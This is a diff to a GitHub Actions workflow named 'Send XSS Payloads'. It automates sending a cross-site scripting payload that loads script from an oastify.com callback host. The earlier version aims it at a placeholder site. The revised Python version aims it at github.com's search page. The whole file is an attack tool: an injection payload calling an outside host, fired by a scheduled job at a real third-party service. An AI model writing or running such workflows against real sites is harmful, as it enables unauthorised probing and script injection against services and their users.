@@ -1,16 +1,40 @@
 name: Send XSS Payloads
 
 on:
-  workflow_dispatch:  # manual trigger
+  workflow_dispatch:
 
 jobs:
-  send-payload:
+  send-xss-payload:
     runs-on: ubuntu-latest
 
     steps:
-      - name: Send XSS payload via curl
+      - name: Set up Python
+        uses: actions/setup-python@v4
+        with:
+          python-version: '3.x'
+
+      - name: Send payload using Python
         run: |
-          PAYLOAD="\"><script src='https://4tyj2iha062ybwrh51nurns8dzjq7h95y.oastify.com'></script>"
-          TARGET_URL="https://your-vulnerable-site.com/search?q="
-          FULL_URL="${TARGET_URL}$(echo $PAYLOAD | jq -sRr @uri)"
-          curl -s "$FULL_URL" -o /dev/null
+          import urllib.parse
+          import requests
+
+          # Your XSS Hunter / collaborator payload
+          payload = '"><script src="https://8t2n2mhe0a22b0rl55nyrrscd3ju7l89x.oastify.com"></script>'
+          
+          # URL you want to test — replace with your actual test target
+          base_url = 'https://github.com/search?q='
+
+          # Safely encode payload
+          encoded_payload = urllib.parse.quote(payload)
+          
+          # Construct full URL
+          test_url = base_url + encoded_payload
+          
+          print(f"[*] Sending request to: {test_url}")
+          
+          try:
+              response = requests.get(test_url, timeout=10)
+              print(f"[+] Response status: {response.status_code}")
+          except Exception as e:
+              print(f"[!] Error sending request: {e}")
+        shell: python
